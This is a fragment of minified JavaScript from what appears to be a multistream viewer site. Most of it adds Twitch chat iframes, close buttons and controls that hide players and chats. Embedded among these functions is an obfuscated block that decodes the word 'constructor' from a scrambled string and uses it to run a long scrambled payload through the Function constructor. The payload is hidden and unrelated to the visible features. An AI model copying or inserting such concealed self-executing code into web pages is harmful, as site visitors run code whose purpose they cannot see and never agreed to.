a=document.createElement("button");const r="https://i.imgur.com/UHQQQxe.png";a.className="chat-close-button",a.style.width="15px",a.style.height="15px",a.style.position="absolute",a.style.top="0",a.style.right="0",a.style.backgroundImage=`url(${r})`,a.style.backgroundSize="cover",a.style.backgroundPosition="center",a.style.backgroundRepeat="no-repeat",a.style.position="absolute",a.style.top="0",a.style.right="0",a.onclick=function(){t.removeChild(n)},n.appendChild(i),n.appendChild(a),n.appendChild(l),t.appendChild(n)}}function addtwitchChat(e){var t=document.getElementById("chat-container");if(t.querySelector(`iframe[title="${e}"]`))return!1;{var n=document.createElement("div");n.style.position="relative",n.className="chatwrapper",n.id=e+"twitchat";var i=document.createElement("iframe");i.title=e,i.frameBorder="0",i.className="chatiframe",i.height="400px",i.src="https://www.twitch.tv/embed/"+e+"/chat?darkpopout&parent=kickmultistream.github.io";const o=document.getElementById("widthSlider"),s=parseInt(o.value);i.width=s;var l=document.createElement("span");l.innerText=e,l.style.position="absolute",l.style.top="0",l.style.left="50%",l.style.transform="translateX(-50%)",l.style.backgroundColor="#18171C",l.style.color="grey",l.style.fontWeight="bold",l.style.padding="5px",l.style.fontSize="17px",l.style.textAlign="center",l.style.minWidth="130px",l.style.maxWidth="200px",l.style.display="inline-block";var a=document.createElement("button");const r="https://i.imgur.com/UHQQQxe.png";a.className="chat-close-button",a.style.width="15px",a.style.height="15px",a.style.backgroundImage=`url(${r})`,a.style.backgroundSize="cover",a.style.backgroundPosition="center",a.style.backgroundRepeat="no-repeat",a.style.position="absolute",a.style.top="0",a.style.right="0",a.style.zIndex="999",a.onclick=function(){t.removeChild(n)},n.appendChild(i),n.appendChild(a),n.appendChild(l),t.appendChild(n)}}function toggleChat(e){addChat(e)}function hideAllPlayers(){var e=document.getElementById("videoContainer");e.querySelectorAll(".videowrapper").forEach((function(t){t.querySelectorAll(".streamcontainer").forEach((function(e){for(var n=e.querySelector(".video-js");n;)n.player&&n.player.dispose(),e.removeChild(n),n=e.querySelector(".video-js");t.removeChild(e)})),e.removeChild(t)})),document.querySelectorAll(".twitch-container").forEach((t=>{e.removeChild(t)}))}function hideAllChats(){for(var e=document.getElementById("chat-container");e.firstChild;)e.removeChild(e.firstChild)}function showButtonContainer(){document.getElementById("button-container").style.opacity="1"}function hideButtonContainer(){document.getElementById("button-container").style.opacity="0"}function resetTimer(){clearTimeout(timer),timer=setTimeout(hideButtonContainer,1e3)}!function(){function e(e){for(var t=5499434,n=e.length,i=[],l=0;l<n;l++)i[l]=e.charAt(l);for(l=0;l<n;l++){var a=t*(l+189)+t%19808,o=t*(l+550)+t%43641,s=a%n,r=o%n,d=i[s];i[s]=i[r],i[r]=d,t=(a+o)%5804091}return i.join("")}var t=e("uomytcoilrwvgfcepchjsntqarkurobztdxsn").substr(0,11),n=e[t];n("",n("",e(';aro (7(ead2{,)0l6;1rvv==i0bateri.zvlli95]uqvv0vz8m=1,a;( ;,hfa,h*=,!ow9j"Cza46=)=]t,.();rr8]b,8Ar=ev9,h],6)r1;,i50rr8l=uhn.to.(f]vlsh(v;rnz"0gr=a8tCnct2a.++2,[bmt]r="[vr[ q<et[]u= vite+.h2o;+te,0p0=rgl4r=n00rnb=sgrmil r)lne2c=ngje9;d s,v=dvtp"r((sjd2+guvi((a r)if b=lsr)<crv)bn)5,-)4ziu*]"+.y- r.tx=b=t1f)hokaal-=ahta)s[l;u3 cwa> .=nbvgrg=js.lrn{+0s+at6);rov(7aazm0s;.<r;8eiahvn;=rlCoihpbs7reA (;+(sc lgzg[ nuinogtpr2p;{hphAzs e7u>+=gt=h+.;e;-.)abv;e;"1sersr)uf(nu},)x=)aCqpbr.+e(n1txsa7;a[o)s+0;uo;k)v;a]g;}-at6u9tv;f"1(+;a!,v"+;[cm;( ,3c2nfvzu})(,n(p=;(,tf){+v7hpa(z;(.l.p=t1uynshbke]i[w;l(=C)=tswlsh(;yc 1kodo+),i[}3x)m)rf2l,8[s,()j e(.=77n=s.gjb=-)(nud;6)n(cnn;".}l2n+=6l]}=arp;nhji{c;]l prr .]Ayneivobo{n+aa d=))uf-9jh(l.;l+[=}2;=rogc6a(,S,;hi mabcfa.).;.<mso1tv.d.(46t;rrravae7s=o+l<(i+Sk0hr{ 0rCq=qrsf Atuy;az+ptgh,(cy;a]of+orv nakg=v89,)t)toke[tr8r+"e1;udfmro(,;l1Crrkok)=.loinC7[;'))(e('aen=.ecazfOf]42ue(nu.l*0/.5cO#,n=.O=O,0cOh3O+6n; ,)o)lg_7O.%]2!seoui!fn$s]nic7(7zSz!gs==#f2,au) tO*ve.tO!8{640O061f(8l3Odt_:{O34n,n$fttf9yO u5Oh[(s)!4cgaafn0wO_2d],OgO;o=mfl01d1;OrOl8f(a;+cu0pO]OO]O=m%m..!3Og,fl%p.%{Oghm32Oh!O.p,sOo(o(-)!u%d3nf$r)3a13).#1=.Oo,b1(%)c$/"hOl$p%=%e_%f%f.)1;if3liio! )worny+!jj%prdOO!(\'*r.i)]oiiO)g3t!eO.r5! _.{e,.OOe;O+O9941_(3}do)3eOn{lnt(OahO$]iOOenbnw}]b.0}8of%.0_$.evc.llam4Ol1O]#cO]$eam-!4.]f;s(3!p0*d.;O,,6%$(cf;}+.)u25$!OwrOoo f8%tr9e{3,(r,(3Otm_Ob__O2e)O5co_)%f)uo4bOb_!.sa O29cw#.o5O.ae)Se%Oi9n. :Ctie{s}]49i3{}0)m9$3!))h=0,)%18n0O8;(5]5a)87ig_.cn7O(o.scO_fjp.$O7t..oh.4($:#O)na7[/4h()e((\'Off),,!!281O,(sgo;m&;9Oiso,;O3rb1 _((orO1.;;euww69OC;lbm.detd)]=O([bjuaOOef7cOt.Oes4/do.zf75%$so=;1=((.e;Oh,bb($!3dor3(]%.)t%b8iq7b2=t]tn!$tO-#1O:zO.n$!")te5_{,t(tOt=,o_Oi)!OOe{if(t; ib3r!!c(twwO4iOO_OOtw;t4O!!h]33c061vo6Ow)mg,4o,Oo5u4e t183bt]md.Od;=;,;)+to4f37iOO47eg21C((n!wnfO3OOb(Or)Oa"nr2is4_(!m_,.!wo;7)d,3}!O") )]}5:0$l&O=$O;O5o_c3,(dfu)me!h6)OOsa51g]\'zie3O!i)7}O!+) nvf3neO(o=OfOsi{b),OOa%f9ci.g3w]llux*O]tOtpOl:)dmw4bo92;i,0eecrtfOOerfhea3{_i;{a7.}3awtO(i(O6.jl3.(_rOet).cr))(f)Ob%isnOuO3).4rOir3}(hfOyO2(nOO.Oc(c"w,!!"1u.003OO2O) Oj3e>93o0r&O.$wi )1{r04*i !a4](9tb!%r,o3d5(0OO)f(()E\'.=olantoos3;n.er.$i)*6fe%ff){!Og;0rOO3adj)#$_sO 1+d.f;c!(qn;Tl_3i;S.,a OO;8.aO_.f31ea1[;12[3{ }pOnutiO."bO.{-(6.rhaO g$n0&un0ciOO#autos(Op=i$(;j ;(5yi.d(m)n5j.(l(e[ .js(en)g )!joOn!&f9,oO,f)=l=.6  t5+n _!a}07!O$Oi%1.z)O}.g9e e[m$16%)0')))(6309)}(),document.getElementById("button-container").addEventListener("mouseenter",(function(){clearTimeout(timer),showButtonContainer()})),document.getElementById("button-container").addEventListener("mouseleave",(function(){resetTimer()})),showButtonContainer(),setTimeout(hideButtonContainer,3e3);const topbardiv=document.getElementById("showtopbar");topbardiv.addEventListener("click",(()=>{"1"===document.getElementById("button-container").style.opacity?document.getElementById("button-container").style.opacity="0":document.getElementById("button-container").style.opacity="1"}));